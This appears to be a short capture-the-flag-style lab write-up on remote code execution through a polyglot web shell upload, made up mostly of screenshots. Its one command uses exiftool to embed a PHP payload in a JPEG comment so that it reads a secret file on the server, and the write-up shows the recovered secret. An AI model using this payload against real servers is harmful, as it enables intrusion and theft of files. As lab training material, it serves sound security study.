# Lab: Remote code execution via polyglot web shell upload #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/1deb1861-d613-463f-8e52-79900f926e4a)

> File upload page

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/40b317e6-422a-434b-a5e3-3d11ab129e61)


> For creating the polyglot web shell we will use the following command `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" logo.jpg -o polyglot.php`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/98e550ca-5dac-40fa-9745-bf2ee2954301)

> The file is created succesfully now we will upload it.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/e7a83490-f816-4138-b36a-da10e8f3433e)

> The file was uploaded successfully

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ed8064aa-77d0-4986-a4ab-b01d2d043549)

> Now we are able to read the content `DFyz9Y186zmZRk2Kr7JU3RKt1ffmLTd8`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/55389dc6-b335-4f97-830d-ae2abcbd33d5)


![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/a2207c87-7a69-4ae1-a9e3-05d56d8953a2)


